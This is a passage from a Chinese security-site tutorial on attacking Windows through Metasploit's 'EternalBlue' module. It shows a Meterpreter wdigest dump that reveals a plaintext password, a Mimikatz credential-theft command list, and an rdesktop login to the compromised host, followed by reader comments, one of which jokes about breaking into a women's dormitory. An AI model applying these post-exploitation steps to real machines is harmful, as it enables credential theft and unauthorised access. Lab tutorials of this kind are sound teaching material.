style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.meterpreter&nbsp;&gt;&nbsp;wdigest
+2.[+]&nbsp;Running&nbsp;as&nbsp;SYSTEM
+3.[*]&nbsp;Retrieving&nbsp;wdigest&nbsp;credentials
+4.wdigest&nbsp;credentials
+5.===================
+6.
+7.AuthID&nbsp;&nbsp;&nbsp;&nbsp;Package&nbsp;&nbsp;&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Password
+8.------&nbsp;&nbsp;&nbsp;&nbsp;-------&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------
+9.0;997&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;NT&nbsp;AUTHORITY&nbsp;&nbsp;LOCAL&nbsp;SERVICE&nbsp;&nbsp;
+10.0;996&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CHINAMAN-PC$&nbsp;&nbsp;&nbsp;
+11.0;47327&nbsp;&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+12.0;999&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CHINAMAN-PC$&nbsp;&nbsp;&nbsp;
+13.0;636147&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ChinaMan-PC&nbsp;&nbsp;&nbsp;ChinaMan&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mima-009
+14.&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注：Mimikatz 的命令帮助：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.Mimikatz&nbsp;Commands
+2.=================
+3.
+4.&nbsp;&nbsp;&nbsp;&nbsp;Command&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description
+5.&nbsp;&nbsp;&nbsp;&nbsp;-------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------
+6.&nbsp;&nbsp;&nbsp;&nbsp;kerberos&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attempt&nbsp;to&nbsp;retrieve&nbsp;kerberos&nbsp;creds
+7.&nbsp;&nbsp;&nbsp;&nbsp;livessp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attempt&nbsp;to&nbsp;retrieve&nbsp;livessp&nbsp;creds
+8.&nbsp;&nbsp;&nbsp;&nbsp;mimikatz_command&nbsp;&nbsp;Run&nbsp;a&nbsp;custom&nbsp;command
+9.&nbsp;&nbsp;&nbsp;&nbsp;msv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attempt&nbsp;to&nbsp;retrieve&nbsp;msv&nbsp;creds&nbsp;(hashes)
+10.&nbsp;&nbsp;&nbsp;&nbsp;ssp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attempt&nbsp;to&nbsp;retrieve&nbsp;ssp&nbsp;creds
+11.&nbsp;&nbsp;&nbsp;&nbsp;tspkg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attempt&nbsp;to&nbsp;retrieve&nbsp;tspkg&nbsp;creds
+12.&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attempt&nbsp;to&nbsp;retrieve&nbsp;wdigest&nbsp;creds</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">（6）远程桌面连接之&nbsp;</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">另开启一个terminal，使用名rdesktop 连接远程桌面&nbsp;</span></p><pre class="brush:plain;toolbar:false">1.root#&nbsp;rdesktop&nbsp;192.168.1.112&nbsp;-u&nbsp;user&nbsp;-p&nbsp;passw0rd</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">有关meterpreter 的功能还有很多，这里就不足做过多的说明了，就是简单记录下本次实战演练过程中遇到的各种问题和小技能有关其他的功能使用可以参考其他文档做进一步的学习。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考学习</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><a href="https://www.zybuluo.com/mdeditor#728079-full-reader" _src="https://www.zybuluo.com/mdeditor#728079-full-reader">https://www.zybuluo.com/mdeditor#728079-full-reader</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://www.hx99.net/Article/Tech/201505/36750.html" _src="https://www.hx99.net/Article/Tech/201505/36750.html">https://www.hx99.net/Article/Tech/201505/36750.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://blog.sina.com.cn/s/blog_4c86552f0102wll1.html" _src="http://blog.sina.com.cn/s/blog_4c86552f0102wll1.html">http://blog.sina.com.cn/s/blog_4c86552f0102wll1.html</a>&nbsp;</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3964.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】MSF框架实现“永恒之蓝”的闪电攻击 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3964" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/3x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="14569" user-name="qg1fnt" href="javascript:;">
+                qg1fnt            </a>
+                        <span class="comment-time">2017-06-13 00:41:04</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14569">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14569" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">mark</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/9x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="749283137" class="response" data-bind-id="749283137" data-target="14566" user-name="myles007" href="javascript:;">
+                myles007            </a>
+                        <span class="comment-time">2017-06-12 20:26:52</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="749283137" data-target="14566">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14566" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">我的环境是64位环境……，不过应该不影响的！</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+<div class="clearfix re-comment">
+    <div class="comment-quote">  
+        <div class="comment-user">
+            <a href="javascript:;" class="response" data-bind-id="2562508640" data-target="14552">Coder_single</a> <span class="comment-time">2017-06-12 15:04:25</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2562508640" data-target="14552">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14552" data-type="comment">点赞</a></span>            </div>
+            <p>想问一下，作者的kali是32还是64的？</p>
+        </div>
+    </div>
+        </div>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/9x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="749283137" class="response" data-bind-id="749283137" data-target="14565" user-name="myles007" href="javascript:;">
+                myles007            </a>
+                        <span class="comment-time">2017-06-12 20:25:49</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="749283137" data-target="14565">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14565" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">并不需要呢，你在检查看看！</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+<div class="clearfix re-comment">
+    <div class="comment-quote">  
+        <div class="comment-user">
+            <a href="javascript:;" class="response" data-bind-id="0" data-target="14548">白帽子</a> <span class="comment-time">2017-06-12 11:57:13</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14548">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14548" data-type="comment">点赞</a></span>            </div>
+            <p>大神，求助！
+我执行的时候报错：RubySMB::Error::UnexpectedStatusCode: Error with login: (0xc000006d) STATUS_LOGON_FAILURE: The attempted logon is invalid. This is either due to a bad username or authentication information.
+连接SMB还需要用户名密码吗？求解！</p>
+        </div>
+    </div>
+        </div>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/1x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="2562508640" class="response" data-bind-id="2562508640" data-target="14552" user-name="Coder_single" href="javascript:;">
+                Coder_single            </a>
+                        <span class="comment-time">2017-06-12 15:04:25</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2562508640" data-target="14552">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14552" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">想问一下，作者的kali是32还是64的？</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="14548" user-name="白帽子" href="javascript:;">
+                白帽子            </a>
+                        <span class="comment-time">2017-06-12 11:57:13</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14548">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14548" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">大神，求助！
+我执行的时候报错：RubySMB::Error::UnexpectedStatusCode: Error with login: (0xc000006d) STATUS_LOGON_FAILURE: The attempted logon is invalid. This is either due to a bad username or authentication information.
+连接SMB还需要用户名密码吗？求解！</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/9x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="873233291" class="response" data-bind-id="873233291" data-target="14546" user-name="Anonymous" href="javascript:;">
+                Anonymous            </a>
+                        <span class="comment-time">2017-06-12 10:47:56</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="873233291" data-target="14546">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14546" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">早玩腻了，入侵女生宿舍。。</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="14545" user-name="白帽子" href="javascript:;">
+                白帽子            </a>
+                        <span class="comment-time">2017-06-12 10:19:13</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14545">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14545" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">好玩吗？ 好玩吗？</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3964" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
